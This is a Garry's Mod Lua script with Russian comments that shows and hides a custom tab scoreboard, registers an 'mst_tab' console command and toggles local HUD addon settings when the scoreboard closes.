--hook.Add('ScoreboardShow', 'tab_scoreboard_show', function()
function mst_ScoreboardShow()	

	if tab_scoreboard != nil then  
		mst_ScoreboardHide()
		--print("Закрыли")	
	end 	

	local plyrs = player.GetAll()
	for id, pl in pairs( plyrs ) do
			pl.ScoreEntry = nil
	end
	
	--if ( !IsValid( tab_scoreboard ) ) then
		tab_scoreboard = vgui.CreateFromTable( tab_SCORE_BOARD )
	--end
	
	if ( IsValid( tab_scoreboard ) ) then
		tab_scoreboard:Show()
		//////
		--print("open")
		--RunConsoleCommand("cl_drawhud", 0)  
		//////
		tab_scoreboard:MakePopup()
		tab_scoreboard:SetKeyboardInputEnabled( false )
	end
	return true
end --)



--hook.Add('ScoreboardHide', 'tab_scoreboard_hide', function()
function mst_ScoreboardHide()	
	--hook.Run('ScoreboardHide', 'tab_scoreboard_hide')
	--print("Nice")
	-- На будущее, а то щас виснет ;p
	if ( IsValid(tab_scoreboard.SearchText) and tab_scoreboard.SearchText:IsEditing()) then
		--return false
	end
	
	
	if ( IsValid( tab_scoreboard ) ) then
		tab_scoreboard:Hide()
		//////
		--print("close")
		--RunConsoleCommand("cl_drawhud", 1)  
		//////
	end

	RunConsoleCommand("mcompass_enabled", "0")
	RunConsoleCommand("atmoshud_enabled", "0")
	
	if( IsValid(tab_scoreboard.SearchFrame) ) then
		tab_scoreboard.SearchFrame:Close()
	end
	
	if(IsValid(tab_scoreboard.SearchText)) then
		LocalPlayer().tab_lastsearch = tab_scoreboard.SearchText:GetValue()
	end
	
	if (IsValid(tab_submenu)) then
		tab_submenu:Hide()
		tab_submenu = nil
	end
	hook.Run('ScoreboardHide', 'tab_scoreboard_hide')
	return true

end --

function sas()	
	--print("Nice")
end 
concommand.Add('mst_tab', mst_ScoreboardShow) 
--mst_ScoreboardHide()
--print("gay power")
 ]]



--[[---------------------------------------------------------
	Name: gamemode:HUDDrawScoreBoard( )
	Desc: If you prefer to draw your scoreboard the stupid way (without vgui)
-----------------------------------------------------------]]
 

